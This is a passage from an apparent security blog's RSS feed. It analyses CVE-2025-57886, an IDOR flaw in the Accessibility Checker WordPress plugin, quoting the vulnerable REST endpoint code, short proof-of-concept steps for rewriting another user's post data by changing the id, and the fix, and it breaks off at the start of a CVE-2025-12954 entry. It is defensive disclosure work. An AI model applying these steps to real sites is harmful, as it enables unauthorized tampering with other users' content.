{&#xA;            register_rest_route(&#xA;                $ns . $version,&#xA;                &amp;#39;/post-scan-results/(?P&amp;lt;id&amp;gt;\d&amp;#43;)&amp;#39;,&#xA;                [&#xA;                    &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;                    &amp;#39;callback&amp;#39;            =&amp;gt; [ $this, &amp;#39;set_post_scan_results&amp;#39; ],&#xA;                    &amp;#39;args&amp;#39;                =&amp;gt; [&#xA;                        &amp;#39;id&amp;#39; =&amp;gt; [&#xA;                            &amp;#39;validate_callback&amp;#39; =&amp;gt; function ( $param ) {&#xA;                                return is_numeric( $param );&#xA;                            },&#xA;                        ],&#xA;                    ],&#xA;                    &amp;#39;permission_callback&amp;#39; =&amp;gt; function () {&#xA;                        return current_user_can( &amp;#39;edit_posts&amp;#39; );&#xA;                    },&#xA;                ]&#xA;            );&#xA;        }&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the logic of the code, we can draw several important points:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Namespace and route&lt;/strong&gt;&#xA;The endpoint is located under &lt;code&gt;accessibility-checker/v1&lt;/code&gt; with the route &lt;code&gt;/post-scan-results/{id}&lt;/code&gt;. The &lt;code&gt;id&lt;/code&gt; parameter is defined as a &lt;strong&gt;number&lt;/strong&gt;, thanks to the regex &lt;code&gt;\d+&lt;/code&gt; and &lt;code&gt;validate_callback&lt;/code&gt;. This is a basic check, but it does not verify if the &lt;code&gt;id&lt;/code&gt; exists or belongs to a specific post type.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;HTTP Method&lt;/strong&gt;&#xA;The route only accepts &lt;code&gt;POST&lt;/code&gt;, suggesting that this is an endpoint for &lt;strong&gt;writing or updating data&lt;/strong&gt;, not just reading.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Permission Check&lt;/strong&gt;&#xA;The &lt;code&gt;permission_callback&lt;/code&gt; only checks for the general capability &lt;code&gt;edit_posts&lt;/code&gt; (Contributor+). The decision to allow or deny the request &lt;strong&gt;is not based on a specific post&lt;/strong&gt;, meaning **a user with general permissions will be allowed to manipulate any &lt;code&gt;id**&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Processing Callback&lt;/strong&gt;&#xA;If permissions are bypassed, WordPress calls &lt;code&gt;set_post_scan_results&lt;/code&gt; with the &lt;code&gt;$id&lt;/code&gt; provided by the client. Here, the entire data processing logic completely &lt;strong&gt;trusts the &lt;code&gt;id&lt;/code&gt; value controlled by the client&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function set_post_scan_results( $request ) {&#xA;    if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;A required parameter is missing.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    $post    = get_post( $post_id );&#xA;    if ( ! is_object( $post ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post is not valid.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $post_type  = get_post_type( $post );&#xA;    $post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;    if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;The post type is not set to be scanned.&amp;#39; ], 400 );&#xA;    }&#xA;&#xA;    $rules = edac_register_rules();&#xA;    $js_rule_ids = [];&#xA;    $combined_rule_ids = [];&#xA;    ...&#xA;&#xA;    try {&#xA;        do_action( &amp;#39;edac_before_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;&#xA;        $violations = $request[&amp;#39;violations&amp;#39;];&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 1, &amp;#39;js&amp;#39; );&#xA;&#xA;        if ( is_array( $violations ) &amp;amp;&amp;amp; count( $violations ) &amp;gt; 0 ) {&#xA;            foreach ( $violations as $violation ) {&#xA;                $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;                $actual_rule_id = $combined_rule_ids[ $rule_id ] ?? $rule_id;&#xA;                if ( in_array( $actual_rule_id, $js_rule_ids, true ) ) {&#xA;                    ...&#xA;                    ( new Insert_Rule_Data() )-&amp;gt;insert( $post, $actual_rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;                    ...&#xA;                }&#xA;            }&#xA;        }&#xA;&#xA;        do_action( &amp;#39;edac_after_validate&amp;#39;, $post_id, &amp;#39;js&amp;#39; );&#xA;        edac_remove_corrected_posts( $post_id, $post-&amp;gt;post_type, 2, &amp;#39;js&amp;#39; );&#xA;&#xA;        $metrics = $request[&amp;#39;densityMetrics&amp;#39;] ?? [ 0, 0 ];&#xA;        update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;&#xA;        ( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;        update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&#xA;&#xA;        do_action( &amp;#39;edac_validate_before_sending_rest_response&amp;#39;, $post_id, &amp;#39;js&amp;#39;, $request );&#xA;&#xA;        return new \WP_REST_Response( [ &amp;#39;success&amp;#39; =&amp;gt; true, &amp;#39;id&amp;#39; =&amp;gt; $post_id, &amp;#39;timestamp&amp;#39; =&amp;gt; time() ] );&#xA;&#xA;    } catch ( \Exception $ex ) {&#xA;        return new \WP_REST_Response( [ &amp;#39;message&amp;#39; =&amp;gt; $ex-&amp;gt;getMessage() ], 500 );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function receives a request from the REST API and processes the accessibility scan results for a post. The main logic flow includes:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Input Validation&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $request[&amp;#39;violations&amp;#39;] ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Missing violations&amp;#39; ], 400);&#xA;}&#xA;$post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;$post = get_post( $post_id );&#xA;if ( ! is_object( $post ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Invalid post&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Post Type Check&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$post_type  = get_post_type( $post );&#xA;$post_types = Helpers::get_option_as_array( &amp;#39;edac_post_types&amp;#39; );&#xA;if ( empty( $post_types ) || ! in_array( $post_type, $post_types, true ) ) {&#xA;    return new \WP_REST_Response([ &amp;#39;message&amp;#39; =&amp;gt; &amp;#39;Post type not allowed&amp;#39; ], 400);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Violation Processing&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$rules = edac_register_rules();&#xA;foreach ( $request[&amp;#39;violations&amp;#39;] as $violation ) {&#xA;    $rule_id = $violation[&amp;#39;ruleId&amp;#39;];&#xA;    // Filter valid rules and save to the database&#xA;    (new Insert_Rule_Data())-&amp;gt;insert( $post, $rule_id, $impact, $html, $landmark, $landmark_selector, $selectors );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Update Post Meta and Summary&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;update_post_meta( $post_id, &amp;#39;_edac_density_data&amp;#39;, [ $metrics[&amp;#39;elementCount&amp;#39;] ?? 0, $metrics[&amp;#39;contentLength&amp;#39;] ?? 0 ] );&#xA;( new Summary_Generator( $post_id ) )-&amp;gt;generate_summary();&#xA;update_post_meta( $post_id, &amp;#39;_edac_post_checked_js&amp;#39;, time() );&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Return Response&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;return new \WP_REST_Response([&#xA;    &amp;#39;success&amp;#39; =&amp;gt; true,&#xA;    &amp;#39;id&amp;#39; =&amp;gt; $post_id,&#xA;    &amp;#39;timestamp&amp;#39; =&amp;gt; time()&#xA;]);&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;An attacker with a &lt;strong&gt;Contributor account&lt;/strong&gt; can &lt;strong&gt;arbitrarily manipulate the client-controlled &lt;code&gt;id&lt;/code&gt; parameter&lt;/strong&gt;, pointing to &lt;strong&gt;any post&lt;/strong&gt;, while the permission check relies solely on &lt;code&gt;edit_posts&lt;/code&gt;. This allows the attacker to &lt;strong&gt;write or overwrite &lt;code&gt;violations&lt;/code&gt; data on posts they do not own&lt;/strong&gt;, leading to &lt;strong&gt;unauthorized modification of other users&amp;rsquo; data (IDOR)&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;When creating a post with a Contributor user, you will see the &lt;strong&gt;Accessibility Checker&lt;/strong&gt; statistics appear directly on the post editing page.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#34; title=&#34;Thống kê của Accessibility Checker&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/post.png&#34; data-sub-html=&#34;&lt;h2&gt;Post&lt;/h2&gt;&lt;p&gt;Thống kê của Accessibility Checker&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/post.png&#39; alt=&#34;Post&#34; height=&#34;1048&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thống kê của Accessibility Checker&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;By filtering requests with the phrase &lt;code&gt;post-scan-results&lt;/code&gt; in Burp History, you can capture a valid request provided by the plugin:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#34; title=&#34;Filter request trong Burp History&#34; data-thumbnail=&#34;/posts/2025-12-22-cve-2025-57886/request.png&#34; data-sub-html=&#34;&lt;h2&gt;Request&lt;/h2&gt;&lt;p&gt;Filter request trong Burp History&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-22-cve-2025-57886/request.png&#39; alt=&#34;Request&#34; height=&#34;1357&#34; width=&#34;1277&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter request trong Burp History&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Simply by modifying the &lt;code&gt;id&lt;/code&gt; value, one can &lt;strong&gt;unauthorizedly modify data&lt;/strong&gt; in another person&amp;rsquo;s post.&lt;/p&gt;&#xA;&lt;p&gt;Version &lt;strong&gt;v1.30.1&lt;/strong&gt; fixed the vulnerability by changing the &lt;strong&gt;permission callback&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;    return $this-&amp;gt;user_can_edit_passed_post_id( $request );&#xA;}&#xA;&#xA;public function user_can_edit_passed_post_id( $request ) {&#xA;    $post_id = (int) $request[&amp;#39;id&amp;#39;];&#xA;    return current_user_can( &amp;#39;edit_post&amp;#39;, $post_id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;The callback now receives &lt;code&gt;$request&lt;/code&gt; to check a &lt;strong&gt;specific post&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt; → WordPress verifies:&lt;/li&gt;&#xA;&lt;li&gt;Whether the user has permission to edit this post.&lt;/li&gt;&#xA;&lt;li&gt;Whether the post is owned by the user.&lt;/li&gt;&#xA;&lt;li&gt;Whether the post status (draft, published, private) allows the operation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated attacker (Contributor&amp;#43;)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Craft POST request to REST API&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;POST /wp-json/accessibility-checker/v1/post-scan-results/{id}&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Manipulate {id} to target post_id&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;permission_callback: current_user_can(&amp;#39;edit_posts&amp;#39;)&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Permission granted&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;set_post_scan_results()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;get_post(target_post_id)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;Process violations data&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;update_post_meta(target_post_id, *edac**)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Target post data modified&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create/edit a post with a &lt;strong&gt;Contributor&lt;/strong&gt; account.&lt;/li&gt;&#xA;&lt;li&gt;Capture the request to &lt;code&gt;/wp-json/accessibility-checker/v1/post-scan-results/{id}&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Resend the request with the &lt;code&gt;id&lt;/code&gt; of another user&amp;rsquo;s post and arbitrary &lt;code&gt;violations&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-57886 is an &lt;strong&gt;IDOR vulnerability in the REST API&lt;/strong&gt; caused by the &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; plugin only checking permissions at a &lt;strong&gt;general capability level (&lt;code&gt;edit_posts&lt;/code&gt;)&lt;/strong&gt; without validating &lt;strong&gt;editing permissions on a specific post&lt;/strong&gt;. This allows an attacker with Contributor privileges to &lt;strong&gt;arbitrarily manipulate the &lt;code&gt;id&lt;/code&gt; parameter&lt;/strong&gt; in the REST API request to &lt;strong&gt;write or overwrite accessibility data&lt;/strong&gt; on posts they do not own, leading to &lt;strong&gt;unauthorized data modification&lt;/strong&gt;. Version 1.30.1 fixed this by applying &lt;strong&gt;post-level authorization&lt;/strong&gt; via &lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;REST APIs using &lt;strong&gt;client-controlled object identifiers&lt;/strong&gt; must always include &lt;strong&gt;permission checks on the specific object&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;A &lt;strong&gt;Global capability check&lt;/strong&gt; (&lt;code&gt;edit_posts&lt;/code&gt;) is insufficient to protect data-writing operations based on &lt;code&gt;post_id&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR can occur even when the request is generated from &lt;strong&gt;valid client-side logic&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;In WordPress, &lt;strong&gt;&lt;code&gt;current_user_can(&#39;edit_post&#39;, $post_id)&lt;/code&gt;&lt;/strong&gt; is the standard measure to prevent post-level IDOR.&lt;/li&gt;&#xA;&lt;li&gt;REST endpoints that &lt;strong&gt;write data&lt;/strong&gt; should be considered priority attack surfaces during plugin audits.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/accessibility-checker/vulnerability/wordpress-accessibility-checker-by-equalize-digital-plugin-1-30-0-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin &amp;lt;= 1.30.0 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;&#xA;</description>
    </item>
    <item>
      <title>CVE-2025-12954 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-21-cve-2025-12954/</link>
      <pubDate>Sun, 21 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-21-cve-2025-12954/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-21-cve-2025-12954/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Timetable and Event Schedule by MotoPress&lt;/strong&gt; WordPress plugin prior to version &lt;strong&gt;2.4.16&lt;/strong&gt; does not verify whether a user has permission to access a specific event when performing the duplicate action, allowing users with roles as low as &lt;strong&gt;Contributor&lt;/strong&gt; to arbitrarily disclose events.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-12954&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-12954&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.4.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.4.16&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/mp-timetable/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Timetable and Event Schedule Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 